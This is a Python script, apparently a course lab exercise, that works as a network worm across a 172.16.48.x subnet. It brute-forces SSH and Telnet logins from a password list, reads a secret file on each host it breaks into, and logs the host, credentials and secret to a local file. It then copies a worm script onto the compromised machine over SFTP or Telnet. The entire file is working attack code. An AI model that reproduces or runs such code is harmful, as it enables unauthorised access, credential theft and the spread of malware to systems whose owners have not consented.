import telnetlib
import paramiko
import os
import socket
import subprocess

def connect(user, pwd, host):
    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=user, password=pwd, timeout=10, banner_timeout=20, look_for_keys=False)
    print("successful connection")
    sftp = client.open_sftp()
    f = sftp.file("Q2secret").read().decode()

    with open('Q2secrets', 'a') as s:
        s.write(f"{host} {user} {pwd} {f}")

    with open('Q2worm.py', "r") as w:
        worm = w.read().encode('ascii')
        f = sftp.file("Q2worm.py", "w").write(worm + b'\n')
    client.close()

cwd = os.getcwd()
users = []
ipAddresses = [24,88,90,102,120,163,196,204,240]

with open(os.path.join(cwd, "Q2pwd"), "r") as f:
    for line in f:
        lineArr = line.strip().split(" ")
        users.append(lineArr)

for address in ipAddresses:
    ip = "172.16.48." + str(address)
    for user in users:
        username = user[0]
        pwd = user[1]
        try:
            client = paramiko.client.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=pwd, timeout=10, banner_timeout=20, look_for_keys=False)
            print(f"Successfully logged in with username '{username}' and password ‘{pwd}’")
            client.close()

        except paramiko.SSHException as e:
            print(f"Connection failed at: {ip}")

        except socket.timeout:
            print(f"Connection timed out")
        except Exception as e:
            print(f"Error connecting")

for i in [77,120,204]:
        ip_address = '172.16.48.' + str(i)
        print('telnet ' + ip_address)
        for user in users:
            username = user[0]
            pwd = user[1]
            try:
                tn = telnetlib.Telnet(ip_address, timeout=3)
                tn.read_until(b"login: ")
                tn.write(username.encode('ascii') + b"\n")
                tn.read_until(b"Password: ")
                tn.write(pwd.encode('ascii') + b"\n")
                login_output = tn.read_until(b"$", 5).decode('ascii')
                if "$" in login_output:
                    print(f"Successfully logged in with username '{username}' and password '{pwd}'")
                    tn.write(b"ls\n")
                    tn.write(b"cat Q2secret\n")
                    output = tn.read_until(b"$ ", timeout=10).decode('ascii', 'ignore')
                    output1 = tn.read_until(b"$ ", timeout=10).decode('ascii', 'ignore')
                    output1 = output1.strip() + '\n'
                    with open('Q2wormtn.py', 'rb') as f:
                        tn.write(b'cat > tmp.py\n')
                        tn.write(f.read())
                        tn.write(b'\n')
                        tn.write(b"exit\n")
                        secrets = open("Q2secrets", 'a')
                        secrets.write(output1.strip('$'))
                        secrets.close()
                        break
                else:
                    print(f"Connection failed at: ‘{ip_address}’")
                tn.close()
            except:
                print('username', end=' ')
                print(username, end=' ')
                print('failure')

